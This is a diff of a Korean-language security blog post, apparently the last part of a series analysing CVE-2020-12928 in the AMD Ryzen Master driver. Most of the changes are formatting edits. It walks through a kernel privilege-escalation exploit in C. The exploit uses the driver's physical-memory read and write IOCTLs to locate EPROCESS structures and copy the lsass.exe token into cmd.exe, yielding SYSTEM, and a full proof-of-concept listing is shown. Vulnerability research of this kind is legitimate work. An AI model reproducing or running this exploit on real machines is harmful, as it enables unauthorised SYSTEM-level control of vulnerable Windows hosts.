 &lt;p&gt;&amp;#xC77D;&amp;#xC744; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &lt;code&gt;0x120000000&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &amp;#xC2DC;&amp;#xC791;&amp;#xD574; Page &amp;#xD06C;&amp;#xAE30;&amp;#xC778; &lt;code&gt;0x1000&lt;/code&gt; &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xC99D;&amp;#xAC00;&amp;#xC2DC;&amp;#xD0A4;&amp;#xBA70; &amp;#xC11C;&amp;#xCE6D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;READ_INPUT_BUFFER input_buff = { read_address, len };
 LPVOID output_buff = VirtualAlloc(&lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x100c&lt;/span&gt;, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
 DeviceIoControl(dHandle, READ_IOCTL, &amp;amp;input_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;, output_buff, &lt;span class=&#34;hljs-number&#34;&gt;0x100c&lt;/span&gt;, &amp;amp;dwRet, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
 INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;input_buff&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xBB3C;&amp;#xB9AC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xAE38;&amp;#xC774;(&lt;code&gt;0x1000&lt;/code&gt;)&amp;#xB97C; &amp;#xC8FC;&amp;#xACE0;, &lt;code&gt;output_buff&lt;/code&gt;&amp;#xC5D0; &amp;#xCDA9;&amp;#xBD84;&amp;#xD55C; &amp;#xACF5;&amp;#xAC04;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD574; &lt;code&gt;DeviceIoControl&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;0x81112F08&lt;/code&gt; IOCTL &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xBCF4;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;code&gt;0x81112F08&lt;/code&gt; &amp;#xC740; METHOD_BUFFERED &amp;#xB85C; input&amp;#xACFC; output &amp;#xBC84;&amp;#xD37C;&amp;#xB97C; &amp;#xACF5;&amp;#xC720;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; IOCTL &amp;#xACB0;&amp;#xACFC; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; Input&amp;#xAC12;&amp;#xC774; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;output_buff&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;0xc&lt;/code&gt; (&lt;code&gt;INT64 read_address(0x8) + DWORD len(0x4)&lt;/code&gt;) &amp;#xB9CC;&amp;#xD07C; &amp;#xB354;&amp;#xD55C; &amp;#xC704;&amp;#xCE58;&amp;#xC758; &amp;#xAC12;&amp;#xC774; IOCTL &amp;#xC694;&amp;#xCCAD;&amp;#xC758; &amp;#xACB0;&amp;#xACFC;&amp;#xAC12;&amp;#xC778; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xB418;&amp;#xACE0; &lt;code&gt;result&lt;/code&gt;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC11;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (INT64 j = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; j &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0xF60&lt;/span&gt;; j += &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) { &lt;span class=&#34;hljs-comment&#34;&gt;// Searching Proc Tag&lt;/span&gt;
 	PINT64 proc_ptr = (PINT64)(result + &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt; + j);
 	INT32 proc_val = *(PINT32)proc_ptr
@@ -531,8 +567,10 @@ INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&
 		}            
 	}
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC6B0;&amp;#xC120; &lt;code&gt;result&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;0x10&lt;/code&gt; aligned &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xB3CC;&amp;#xBA70; &lt;code&gt;+0x4&lt;/code&gt; &amp;#xC704;&amp;#xCE58; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xAC12;&amp;#xC774; &lt;code&gt;0x635f7250&lt;/code&gt;(Proc)&amp;#xC778;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xB97C; &amp;#xCC3E;&amp;#xC558;&amp;#xC73C;&amp;#xBA74; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;PROC_HEADER&lt;/code&gt;&amp;#xC758; &amp;#xC608;&amp;#xC0C1; &amp;#xCD5C;&amp;#xB300; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; &amp;#xC57D; &lt;code&gt;0xA0&lt;/code&gt;&amp;#xAE4C;&amp;#xC9C0; &lt;code&gt;0x10&lt;/code&gt; &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xD55C; &amp;#xBC88; &amp;#xB354; &amp;#xB3CC;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;0x00000003&lt;/code&gt; &amp;#xAC12;&amp;#xC774; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xCC3E;&amp;#xACE0;, &amp;#xCC3E;&amp;#xC73C;&amp;#xBA74; &amp;#xD604;&amp;#xC7AC;&amp;#xAE4C;&amp;#xC9C0; &amp;#xAD6C;&amp;#xD55C; Proc tag address &amp;#xC640; page entry offset, header size&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xB2E4;&amp;#xC2DC; &lt;code&gt;EPRCEOSS&lt;/code&gt;&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &lt;code&gt;PROC_DATA&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC758; &amp;#xAC01; &amp;#xBC30;&amp;#xC5F4;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xC758; &amp;#xAC01; &amp;#xD544;&amp;#xB4DC;&amp;#xAC12;(&lt;code&gt;ImageFileName&lt;/code&gt;, &lt;code&gt;Token&lt;/code&gt;, &lt;code&gt;UniqueProcessId&lt;/code&gt;)&amp;#xC744; &amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xAC12;&amp;#xC744; &amp;#xAD6C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;parse_proc&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PROC_DATA proc_data, HANDLE dHandle)&lt;/span&gt; &lt;/span&gt;{
     DWORD bytes_ret = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
@@ -565,8 +603,10 @@ INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&
         }
     }
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;proc_address &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB41C; &amp;#xAC00;&amp;#xC0C1; &amp;#xC8FC;&amp;#xC18C; + page entry offset + header size&lt;/code&gt; &amp;#xAC00; &lt;code&gt;EPROCESS&lt;/code&gt;&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xAC00; &amp;#xB418;&amp;#xBA70; &amp;#xC0AC;&amp;#xC804;&amp;#xC5D0; &amp;#xAD6C;&amp;#xD55C; &lt;code&gt;EPROCESS&lt;/code&gt;&amp;#xC758; &amp;#xAC01; &amp;#xD544;&amp;#xB4DC;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xB354;&amp;#xD574; &lt;code&gt;Token&lt;/code&gt;&amp;#xACFC; &lt;code&gt;ImageFileName&lt;/code&gt;&amp;#xC744; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;ImageFileName&lt;/code&gt;&amp;#xC774; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &lt;code&gt;EPROCESS&lt;/code&gt;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xD544;&amp;#xB4DC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0;, &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xD544;&amp;#xB4DC;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;h2 id=&#34;Overwrite-Token&#34;&gt;&lt;a href=&#34;#Overwrite-Token&#34; class=&#34;headerlink&#34; title=&#34;Overwrite Token&#34;&gt;&lt;/a&gt;Overwrite Token&lt;/h2&gt;&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC774;&amp;#xC804; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xD55C; &amp;#xAC83; &amp;#xCC98;&amp;#xB7FC; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt;&amp;#xAC12;&amp;#xC744; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xD544;&amp;#xB4DC;&amp;#xC5D0; overwrite&amp;#xD558;&amp;#xBA74; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &lt;code&gt;NT AUTORITY\SYSTEM&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xAFD4; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;overwrite_token&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HANDLE dHandle)&lt;/span&gt; &lt;/span&gt;{
     DWORD modulus = cmd_token_addr % &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;;
@@ -596,13 +636,16 @@ INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&
     DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &amp;amp;bytes_ret, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
 
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xB54C; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xBB38;&amp;#xC81C;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294;&amp;#xB370;, Page &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xB9E4;&amp;#xD551;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; memory write&amp;#xC758; &amp;#xACBD;&amp;#xC6B0; &amp;#xC815;&amp;#xD655;&amp;#xD788; Token &amp;#xAC12; 8 bytes&amp;#xB9CC; overwrite&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB2E4;&amp;#xB294; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&amp;#xD574;&amp;#xACB0;&amp;#xBC95;&amp;#xC740; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! Page pool&amp;#xC758; &amp;#xC2DC;&amp;#xC791;&amp;#xBD80;&amp;#xD130; &lt;code&gt;Token&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C; &amp;#xC804;&amp;#xAE4C;&amp;#xC9C0;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xAC12;&amp;#xB4E4;&amp;#xC744; &lt;code&gt;READ_IOCTL&lt;/code&gt;&amp;#xB85C; &amp;#xBAA8;&amp;#xB450; &amp;#xAC00;&amp;#xC838;&amp;#xC640; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD55C; &amp;#xB4A4;, &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; overwrite&amp;#xD560; &amp;#xD1A0;&amp;#xD070;&amp;#xAC12;&amp;#xB9CC; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C; &amp;#xBC84;&amp;#xD37C;&amp;#xB97C; &lt;code&gt;WRITE_IOCTL 0x81112F0C&lt;/code&gt;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; input&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xBA74; Page pool &amp;#xC2DC;&amp;#xC791;&amp;#xC8FC;&amp;#xC18C;&amp;#xBD80;&amp;#xD130; &lt;code&gt;Token&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C; &amp;#xC804;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB294; exploit &amp;#xC804;&amp;#xACFC; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xAC12;&amp;#xC774; &amp;#xC720;&amp;#xC9C0;&amp;#xB418;&amp;#xACE0; &amp;#xD1A0;&amp;#xD070;&amp;#xAC12;&amp;#xB9CC; &amp;#xBCC0;&amp;#xACBD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; cmd&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xACE0; &amp;#xBE4C;&amp;#xB4DC;&amp;#xD55C; PoC&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;..&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/3.gif&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/3.gif&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&amp;#xC775;&amp;#xC2A4; &amp;#xC131;&amp;#xACF5;!&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &amp;#xC804;&amp;#xCCB4; PoC&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
@@ -759,6 +802,7 @@ INT64 system_token_value = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt
     CloseHandle(dHandle);
     &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xAE30;&amp;#xCD08;&amp;#xAC00; &amp;#xBD80;&amp;#xC2E4;&amp;#xD574;&amp;#xC11C; &amp;#xBB3C;&amp;#xB9AC;&amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#x2194; &amp;#xAC00;&amp;#xC0C1; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC0AC;&amp;#xC774; &amp;#xB9E4;&amp;#xD551; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC81C;&amp;#xB300;&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xB290;&amp;#xB77C; &amp;#xACE0;&amp;#xC0DD;&amp;#xC744; &amp;#xC880; &amp;#xD55C; &amp;#xAC70; &amp;#xB9D0;&amp;#xACE0;&amp;#xB294;&amp;#x2026; &amp;#xBB34;&amp;#xB09C;&amp;#xD558;&amp;#xAC8C; &amp;#xBD84;&amp;#xC11D;&amp;#xD588;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;. &amp;#xC5ED;&amp;#xC2DC; &amp;#xACF5;&amp;#xBD80; &amp;#xD55C;&amp;#xBC88; &amp;#xD560; &amp;#xB54C; &amp;#xC81C;&amp;#xB300;&amp;#xB85C; &amp;#xD574;&amp;#xB194;&amp;#xC57C; &amp;#xB098;&amp;#xC911;&amp;#xC5D0; &amp;#xACE0;&amp;#xC0DD;&amp;#xC744; &amp;#xC548;&amp;#xD558;&amp;#xC9C0;&amp;#x3160;&amp;#x3160;&lt;/p&gt;
 &lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778;(?) &amp;#xC81C;&amp;#xBAA9;&amp;#xC758; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xC548;&amp;#xB155;~&lt;/p&gt;
 &lt;blockquote&gt;
@@ -996,7 +1040,8 @@ INT64 system_token_value = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt
 <p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3) &#x2190; Now!</p>
 <hr>
 <p>&#xC5B4;&#xB290;&#xB367; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB124;&#xC694;! &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; Part 3&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD588;&#xB358; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB300;&#xB85C; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xACFC;&#xC815;&#xC744; PoC &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC815;&#xB9AC;&#xD55C; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. &#xC5BC;&#xB978; cmd&#xCC3D;&#xC5D0;&#xC11C; <code>NT AUTHORITY\SYSTEM</code>&#xC744; &#xB744;&#xC6CC;&#xBCF4;&#xC790;&#xAD6C;&#xC694;!</p>
-<p><br></p>
+<br>
+
 <h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="Parse-EPROCESS"><a href="#Parse-EPROCESS" class="headerlink" title="Parse EPROCESS"></a>Parse EPROCESS</h2><p>&#xBA3C;&#xC800; arbitrary read &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; kernel pool&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xD1A0;&#xD070;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
 <ul>
 <li><code>EPROCESS</code> &#xB294; <code>POOL_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xC77C;&#xC815;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li>
@@ -1008,22 +1053,27 @@ PROCESS ffffbd010035b080
     SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">0424</span>    Peb: af3c91000  ParentCid: <span class="hljs-number">0</span>c78
     DirBase: <span class="hljs-number">18e84</span>a000  ObjectTable: ffff9e8945b562c0  HandleCount:  <span class="hljs-number">68.</span>
     Image: cmd.exe</code></pre>
-<p><img src="/2021/08/11/l0ch/windows-driver-part4/1.png" srcset="/img/loading.gif" alt></p>
+
+<p><img src="/2021/08/11/l0ch/windows-driver-part4/1.png" srcset="/img/loading.gif"></p>
 <p><code>cmd.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd010035b080 - 0x80 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>
-<p><br></p>
+<br>
+
 <p>&#xC774;&#xB7EC;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xC815;&#xD55C;&#xC9C0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <code>lsass.exe</code>&#xB3C4; &#xD55C;&#xBC88; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c">PROCESS ffffbd0ffd7480c0
     SessionId: <span class="hljs-number">0</span>  Cid: <span class="hljs-number">0294</span>    Peb: <span class="hljs-number">81e2405000</span>  ParentCid: <span class="hljs-number">01f</span>4
     DirBase: <span class="hljs-number">233b</span>99000  ObjectTable: ffff9e893b5ff480  HandleCount: <span class="hljs-number">1365.</span>
     Image: lsass.exe</code></pre>
-<p><img src="/2021/08/11/l0ch/windows-driver-part4/2.png" srcset="/img/loading.gif" alt></p>
+
+<p><img src="/2021/08/11/l0ch/windows-driver-part4/2.png" srcset="/img/loading.gif"></p>
 <p><code>lsass.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd0ffd7480c0 - 0x70 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB124;&#xC694;.</p>
-<p><br></p>
+<br>
+
 <p>&#xC74C;.. &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBCC4;&#xB85C; <code>POOL_HEADER</code>&#xC640; <code>EPROCESS</code> &#xC0AC;&#xC774; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7EC;&#xB098; &#xB450; &#xC0AC;&#xC9C4; &#xBAA8;&#xB450; &#xD30C;&#xB780;&#xC0C9; &#xBC15;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74; <code>EPROCESS</code> &#xC8FC;&#xC18C;&#xC758; &#xD558;&#xC704; 4 bytes &#xAC12;&#xC740; &#xD56D;&#xC0C1; <code>0x00000003</code>&#xC73C;&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xACE0;, &#xD0DC;&#xADF8;&#xB85C;&#xBD80;&#xD130; &#xC57D; <code>0x100</code> &#xC624;&#xD504;&#xC14B; &#xC0AC;&#xC774;&#xC758; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB2E4;&#xBA74; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xD2B9;&#xC815;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;! IOCTL <code>0x81112F08</code> &#xB85C; &#xBAA8;&#xB4E0; kernel pool&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC6B0;&#xB9AC;&#xAC00; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0A4;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>EPROCESS</code> &#xB610;&#xD55C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <blockquote>
